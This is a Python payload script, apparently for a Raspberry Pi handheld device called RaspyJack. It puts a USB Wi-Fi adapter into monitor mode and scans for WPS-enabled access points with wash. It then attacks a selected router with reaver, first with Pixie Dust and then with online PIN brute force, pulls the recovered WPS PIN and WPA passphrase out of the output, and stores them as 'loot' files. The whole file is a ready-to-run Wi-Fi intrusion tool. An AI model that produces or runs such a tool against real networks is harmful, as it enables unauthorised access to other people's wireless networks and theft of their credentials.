#!/usr/bin/env python3
"""
RaspyJack Payload -- WPS Pixie Dust + Brute-Force
===================================================
Author: 7h30th3r0n3

Attack WPS-enabled access points using Pixie Dust (offline)
and online brute-force via reaver/wash.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- apt install reaver (provides both reaver and wash)

Flow:
  1) Scan for WPS-enabled APs using wash
  2) Display list with lock status on LCD
  3) User selects target
  4) Try Pixie Dust first (reaver -K 1)
  5) Fallback to online brute-force if Pixie fails
  6) Parse reaver output for WPS PIN and WPA PSK

Controls:
  OK        -- Select AP / start attack
  UP / DOWN -- Scroll AP list
  KEY1      -- Rescan APs
  KEY2      -- Toggle Pixie / Brute mode
  KEY3      -- Exit

Loot: /root/Raspyjack/loot/WPS/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/WPS"
os.makedirs(LOOT_DIR, exist_ok=True)

ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# WiFi helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"),
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find first USB WiFi interface (skip onboard)."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if _is_onboard_wifi_iface(name):
                continue
            return name
    except Exception:
        pass
    return None


def _set_monitor_mode(iface):
    """Put interface into monitor mode."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "monitor"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_managed_mode(iface):
    """Restore managed mode."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        subprocess.run(cmd, capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Tool availability check
# ---------------------------------------------------------------------------

def _check_tools():
    """Verify reaver and wash are available."""
    missing = []
    for tool in ("reaver", "wash"):
        result = subprocess.run(
            ["which", tool], capture_output=True, timeout=5,
        )
        if result.returncode != 0:
            missing.append(tool)
    return missing


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []            # {"bssid", "channel", "signal", "wps_version", "locked", "ssid"}
scroll_pos = 0
selected_idx = -1
status_msg = "Idle"
view_mode = "scan"      # scan | attack | result
attack_mode = "pixie"   # pixie | brute
attack_running = False
running = True
progress_msg = ""
found_pin = ""
found_psk = ""

_iface = None
_mon_iface = None
_reaver_proc = None

# ---------------------------------------------------------------------------
# WPS AP scanning via wash
# ---------------------------------------------------------------------------

def _scan_wps_aps(iface):
    """Scan for WPS-enabled APs using wash."""
    _set_monitor_mode(iface)
    time.sleep(1)

    # Determine monitor interface name
    mon_iface = iface
    # Check if monitor interface got renamed
    try:
        result = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("Interface ") and "mon" in line:
                mon_iface = line.split()[1]
                break
    except Exception:
        pass

    global _mon_iface
    _mon_iface = mon_iface

    aps = []
    try:
        proc = subprocess.Popen(
            ["sudo", "wash", "-i", mon_iface, "-s"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
        )
        # Let wash run for a few seconds
        time.sleep(8)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

        output = proc.stdout.read()

        for line in output.splitlines():
            # wash output: BSSID  Channel  RSSI  WPS Version  WPS Locked  ESSID
            parts = line.split()
            if len(parts) < 6:
                continue
            bssid_match = re.match(r"[0-9A-Fa-f:]{17}", parts[0])
            if not bssid_match:
                continue
            try:
                channel = int(parts[1])
                rssi = int(parts[2])
            except (ValueError, IndexError):
                continue

            wps_ver = parts[3] if len(parts) > 3 else "?"
            locked_str = parts[4] if len(parts) > 4 else "No"
            locked = locked_str.lower() in ("yes", "1")
            ssid = " ".join(parts[5:]) if len(parts) > 5 else "<hidden>"

            aps.append({
                "bssid": parts[0].upper(),
                "channel": channel,
                "signal": rssi,
                "wps_version": wps_ver,
                "locked": locked,
                "ssid": ssid,
            })
    except Exception:
        pass

    aps.sort(key=lambda a: a["signal"], reverse=True)
    return aps


def _do_scan():
    """Background WPS scan."""
    global ap_list, scroll_pos, selected_idx, status_msg, view_mode

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi found"
        return

    with lock:
        status_msg = "Scanning WPS APs..."
        view_mode = "scan"

    found = _scan_wps_aps(iface)

    with lock:
        ap_list = found
        scroll_pos = 0
        selected_idx = 0 if found else -1
        status_msg = f"Found {len(found)} WPS APs"


# ---------------------------------------------------------------------------
# Reaver attack
# ---------------------------------------------------------------------------

def _run_reaver(ap, mode):
    """Run reaver against target AP."""
    global attack_running, progress_msg, found_pin, found_psk
    global _reaver_proc, status_msg, view_mode

    mon = _mon_iface or _iface
    bssid = ap["bssid"]
    channel = str(ap["channel"])

    with lock:
        attack_running = True
        found_pin = ""
        found_psk = ""
        progress_msg = f"{mode.title()} attacking..."
        view_mode = "attack"
        status_msg = f"Attacking {ap['ssid'][:12]}..."

    cmd = ["sudo", "reaver", "-i", mon, "-b", bssid, "-c", channel, "-vv"]
    if mode == "pixie":
        cmd.append("-K")
        cmd.append("1")

    try:
        _reaver_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
    except Exception as exc:
        with lock:
            status_msg = f"reaver failed: {exc}"
            attack_running = False
        return

    pin_pattern = re.compile(r"WPS PIN:\s*['\"]?(\d{4,8})['\"]?", re.I)
    psk_pattern = re.compile(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", re.I)
    progress_pattern = re.compile(r"(\d+\.?\d*)%\s*complete", re.I)

    try:
        for line in iter(_reaver_proc.stdout.readline, ""):
            if not running or not attack_running:
                break

            line = line.strip()

            # Check for PIN
            pin_match = pin_pattern.search(line)
            if pin_match:
                with lock:
                    found_pin = pin_match.group(1)
                    progress_msg = f"PIN: {found_pin}"

            # Check for PSK
            psk_match = psk_pattern.search(line)
            if psk_match:
                with lock:
                    found_psk = psk_match.group(1)
                    progress_msg = f"PSK: {found_psk[:16]}"

            # Check progress
            prog_match = progress_pattern.search(line)
            if prog_match:
                with lock:
                    progress_msg = f"{mode.title()}: {prog_match.group(1)}%"

            # Check for failure messages
            if "failed" in line.lower() or "timeout" in line.lower():
                with lock:
                    progress_msg = f"{mode.title()}: {line[:20]}"

    except Exception:
        pass
    finally:
        if _reaver_proc and _reaver_proc.poll() is None:
            _reaver_proc.terminate()
        _reaver_proc = None

    with lock:
        attack_running = False
        if found_pin or found_psk:
            status_msg = "Attack succeeded!"
            view_mode = "result"
            _save_result(ap)
        else:
            status_msg = f"{mode.title()} attack failed"
            progress_msg = "No PIN/PSK found"


def _save_result(ap):
    """Save found credentials to loot."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    data = {
        "timestamp": ts,
        "ssid": ap["ssid"],
        "bssid": ap["bssid"],
        "channel": ap["channel"],
        "wps_pin": found_pin,
        "wpa_psk": found_psk,
        "attack_mode": attack_mode,
    }
    path = os.path.join(LOOT_DIR, f"wps_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "WPS Pixie/Brute", fill="CYAN", font=font)

    with lock:
        st = status_msg
        vm = view_mode
        sp = scroll_pos
        si = selected_idx
        aps = list(ap_list)
        am = attack_mode
        prog = progress_msg
        pin = found_pin
        psk = found_psk
        atk = attack_running

    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    if vm == "scan":
        y = 28
        for i, ap in enumerate(aps[sp:sp + ROWS_VISIBLE]):
            real_i = sp + i
            prefix = ">" if real_i == si else " "
            color = "YELLOW" if real_i == si else "WHITE"
            lock_icon = "L" if ap["locked"] else " "
            ssid = ap["ssid"][:11] or "?"
            line = f"{prefix}{lock_icon}{ssid} ch{ap['channel']}"
            draw.text((2, y), line[:22], fill=color, font=font)
            y += 14

        mode_color = "MAGENTA" if am == "pixie" else "ORANGE"
        draw.text((2, 116), f"[{am.upper()}] OK=go K1=scan", fill=mode_color, font=font)

    elif vm == "attack":
        mode_label = "PIXIE DUST" if am == "pixie" else "BRUTE FORCE"
        draw.text((2, 32), f"Mode: {mode_label}", fill="MAGENTA", font=font)
        draw.text((2, 48), prog[:22], fill="YELLOW", font=font)

        if pin:
            draw.text((2, 64), f"PIN: {pin}", fill="GREEN", font=font)
        if psk:
            draw.text((2, 78), f"PSK: {psk[:16]}", fill="GREEN", font=font)

        if atk:
            draw.text((2, 116), "Attacking... K3=exit", fill="RED", font=font)
        else:
            draw.text((2, 116), "K2=mode OK=retry", fill="GRAY", font=font)

    elif vm == "result":
        draw.text((2, 32), "SUCCESS!", fill="GREEN", font=font)
        if pin:
            draw.text((2, 50), f"PIN: {pin}", fill="GREEN", font=font)
        if psk:
            draw.text((2, 66), f"PSK:", fill="WHITE", font=font)
            draw.text((2, 80), psk[:22], fill="GREEN", font=font)
            if len(psk) > 22:
                draw.text((2, 94), psk[22:44], fill="GREEN", font=font)
        draw.text((2, 116), "Saved! K3=exit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, scroll_pos, selected_idx, view_mode, attack_mode
    global _iface, attack_running

    _iface = _find_usb_wifi()

    try:
        # Check tool availability
        missing = _check_tools()
        if missing:
            with lock:
                global status_msg
                status_msg = f"Missing: {', '.join(missing)}"
            _draw_screen()
            # Wait for KEY3
            while True:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    return
                time.sleep(0.15)

        if not _iface:
            with lock:
                status_msg = "No USB WiFi found!"
            _draw_screen()
            while True:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    return
                time.sleep(0.15)

        _draw_screen()

        # Initial scan
        threading.Thread(target=_do_scan, daemon=True).start()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    vm = view_mode
                    si = selected_idx
                    aps = list(ap_list)
                    atk = attack_running
                    am = attack_mode

                if vm == "scan" and 0 <= si < len(aps) and not atk:
                    threading.Thread(
                        target=_run_reaver, args=(aps[si], am),
                        daemon=True,
                    ).start()
                elif vm in ("attack", "result") and not atk:
                    with lock:
                        view_mode = "scan"
                        scroll_pos = 0

            elif btn == "UP":
                with lock:
                    if view_mode == "scan":
                        if selected_idx > 0:
                            selected_idx -= 1
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx

            elif btn == "DOWN":
                with lock:
                    if view_mode == "scan":
                        if selected_idx < len(ap_list) - 1:
                            selected_idx += 1
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1

            elif btn == "KEY1":
                if not attack_running:
                    threading.Thread(target=_do_scan, daemon=True).start()

            elif btn == "KEY2":
                with lock:
                    if not attack_running:
                        attack_mode = "brute" if attack_mode == "pixie" else "pixie"

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        # Kill reaver if still running
        if _reaver_proc and _reaver_proc.poll() is None:
            _reaver_proc.terminate()
            try:
                _reaver_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                _reaver_proc.kill()

        # Restore interface
        if _iface:
            _set_managed_mode(_iface)

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 56), "WPS attack stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
